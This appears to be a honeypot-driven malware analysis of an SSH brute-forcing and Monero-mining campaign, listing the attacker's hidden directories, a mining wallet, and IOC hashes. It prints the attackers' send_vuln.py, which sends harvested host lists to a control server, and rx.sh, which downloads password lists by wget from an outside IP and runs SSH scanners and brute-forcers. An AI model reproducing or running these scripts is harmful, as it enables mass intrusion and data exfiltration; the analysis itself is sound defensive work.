
### The log file

<img src="https://i.imgur.com/OlKKF60.png" alt="http://209.141.32.204" width="70%" height="35%">
<br>
The command below was used in the screenshot above to scrape & print information about a session in which the user tires to use my honeypot to mine Moner.

```bash
tail -f cowrie.json | jq -r '. | select(.eventid | contains("cowrie.command.input")) | "CMD: " + .input, "Session: " + .session,  "SRC IP: " + .src_ip + "\r\n"'
```
The image below shows the results of the DirSearch scan of 209.141.32[.]204. The image shows that the IP has a couple of hidden directories and a handful of other files. 
<img src="https://i.imgur.com/TGUCk5q.png" alt="http://209.141.32.204 dirsearch" width="35%" height="35%">

### The hidden .ssh directory
The image below shows the contents of `http://209.141.32[.]204/.ssh`. Right of away, two files grab my attention. The `config.json` and the `krane` file. These grab my attention because those files were created just three days ago.<br><br>
<img src="https://i.imgur.com/SGZIAVk.png" alt="http://209.141.32[.]204/.ssh" width="35%" height="35%">

## Config.json
The `config.json` file also caught my eye because config.json files are often used by miners for mining. 
The following Monero address was being used for the mining. The pool that was being used was "hashvault.pro".

`49ubSTdDp9hPmYE7paRM6PZFLmqvsedZ56MXLUT8mvYnTzjVCKGDbpuW4RVdvZon228uWnkjoJN8S6w5S4LdgeK8UBMMEhJ`

Most miners have a feature built into the miner that allows the user to donate some of their hashes to the developers. This miner might donate all their hashes to the developers 1 minute every hour. The value was set as 1, this is intresting becauase they author of the malware was donating their hash power to the developers.  This might be on purpose or a careless mistake of a inexperienced malware author. 

### The .db directory
<img src="https://i.imgur.com/DI2TCio.png" alt="http://209.141.32[.]204/.db" width="35%" height="35%">
<br>
The image above shows the contents of the .db directory. The directory contains a handful of text files that are used by the malware to brute force machines that have SSH exposed.<br>

<img src="https://i.imgur.com/DFAvqKD.png" alt="http://209.141.32[.]204/.db" width="35%" height="35%"><br>
The image above shows the contents of pass.txt. The pass.txt file contains popular passswords and usernames. 

### K 
The 'k' file can be found at `http://209.141.32[.]204/k`. In order to ungzip the file, we need to use the `cp k k.gz` commmand to add the 
gz extension to the file. This is needed so we can ungzip the file. Next we used `gzip -d k.gz` to ungzip the file. The result ended with a new file named `k.tar`. Once again we have to use the command `cp k k.tar` to change the file's extension to .tar. Lastly we use the command 
`tar -xvf k.tar` to untar the file. The results are a new hidden folder named `.k.tar`. 

```
a:             ASCII text
boner:         ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
k_config.json: JSON data
main:          ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6585c7cd03ec265663087a7edaa517813514e9fa, for GNU/Linux 3.2.0, not stripped
ra:            ASCII text
rx:            ASCII text
send_vuln.py:  Python script, ASCII text executable
ta:            ASCII text
tx:            ASCII text
x:             ASCII text
```
The snippet above shows the contents of the .k.tar directory. 

## The contents of k_config.json
```text
{
    "remote":
    {
        "ip_to_send_vuln": "209.141.32.204",
        "port_to_send_vuln": 10102
    },

    "events":
    {
        "send_vuln_after_seconds": 15

    }
}
```
The snippet above shows the contents of k_config.json. The JSON file looks like a config file that contains the IP and the port that is used by the malware.  By looking at the events key, it looks like this config file is used with by the `send_vuln.py` file. The port that the config file uses is port 10102. The IP that is listed in the config file is the same IP that was used to download all the other files.

### The send_vuln.py file
```python
import socket
import json
import time
import os

data = ""

with open("k_config.json", 'r') as ftr:
    data = json.load(ftr)


remote_data = [data["remote"]["ip_to_send_vuln"], data["remote"]["port_to_send_vuln"]]
trigger_after_econds = data["events"]["send_vuln_after_seconds"]

def read_file(filename):
    ce_am_citit = []
    with open(filename, 'r') as ftr:
        for l in ftr:
            ce_am_citit.append(l.strip())

    return ce_am_citit

def remove_file(filename):
    os.remove(filename)



start_time = 0
while True:
    time.sleep(1)
    try:
        if time.time() - start_time > trigger_after_econds:
            start_time = time.time()
            prinse = read_file("prinse.txt")
            if len(prinse) < 1:
                continue

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((remote_data[0], remote_data[1]))

            string_to_send = ""

            for p in prinse:
                string_to_send += p + "\n"

            sock.send(bytes(string_to_send, "UTF-8"))
            print("vuln sent")
            remove_file("prinse.txt")

            sock.close()
    except:
        pass
```

The snippet above shows the contents of the `send_vuln.py` file. The file is written in Python. By looking at the script it looks like the Python script reads the `k_config.json` file to gather the port and IP of the control server, the code then uses Python's socket module to connect to server. 

## rx.sh 
The snippet above shows the contents of the rx.sh file. 
```bash
rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit -Hn ; ulimit -n 99999 -u 999999
while true; do

        ###      Aici incarcam parolele!!

        File=mic
        rm -rf "$File"
        echo "#Incarc Parolele#"
        wget http://209.141.58.203/.db/$File
        if grep -q oracle "$File";
        then
        cat "$File" > passfile.txt
        fi
        rm -rf "$File"




        #### Aici stergem fisierele anterioare si scanam unele noi!!

        rm -rf bios.txt mfu.txt ipuri scan.lst banner.log
        echo "###Incarc Ipuri###"
        random="$((30 + $RANDOM % 224))"
        ./cosynus 22 -a "$random" -s 10 > /dev/null
        pkill -f cosynus
        pkill -f ./cosynus
        cat bios.txt |uniq > mfu.txt
        rm -rf bios.txt
        sleep 1
        echo "#Am terminat de scanat, dau drumu la banner#"
        ./boner mfu.txt 22 1000 > /dev/null
        pkill -f boner
        pkill -f ./boner
        cat banner.log  |grep SSH-2.0-OpenSSH |awk '{print $1}' |uniq >> scan.lst
        cat scan.lst |uniq > ipuri
        ./main 1000
         echo "$random" >> oK
done
```
The rx.sh script contains a couple of comments like `Aici incarcam parolele!!`. Using Google translate the author was able to figure out that the author of the malware might be a native Romanian speaker. The English translation of `Aici incarcam parolele!!` is 'Here we upload the passwords !!' according to Google Translate. 

Another comment inside the bash file contained the Romanian text, `Aici stergem fisierele anterioare si scanam unele noi!!`. The English translation is `Here we delete the previous files and scan new ones !!`.


### IOC
dfa6d202fc24623a5aadf3684aadcfbce72ee8aa  config.json<br>
f1cb326ee8ab4217cf9191f395e35fe684dd426a  a<br>
bfa1d6ecc6a4f2da893b88f15b96a96320dd27c5  b<br>
d987680671c4c35610d659dd5dc2e0f4d387e0b4  pass.txt<br>
3fbbd4ef15e064bd2f4b8b643aacbafdfc347833  dump.txt<br>
16e358574ef61f841f8b6ddb45188446c7da8c7d  k<br>
ad4649a79b67c1db9a8343e18af3b7c0d323172c  a<br>
a9c7d059a22fed787f48698c5c10b0b5146f616d  boner<br>
9c9a96383883601d9ad8a7d78eb3995a7dfbc350  k_config.json<br>
2ccf0c37b004b1793dd79792dc6ffd83e7438137  main<br>
1f8f3d751b578242e9c2b32391c8a162e154c7b2  ra<br>
e5dcaab24fab63b050a5a80b50f5a9ad17d127f1  rx<br>
638108b2217b21843ba7f1c80a95f756e5e2310d  send_vuln.py<br>
a82a8eda9177b2ef1e8936784d0aa5d79fa2ddce  ta<br>
e85c6b190d672884a4a37039cb35dfc73a84318a  tx<br>
f5f323005f8c71324c53c864d28db4cbed8e78ac  x<br>
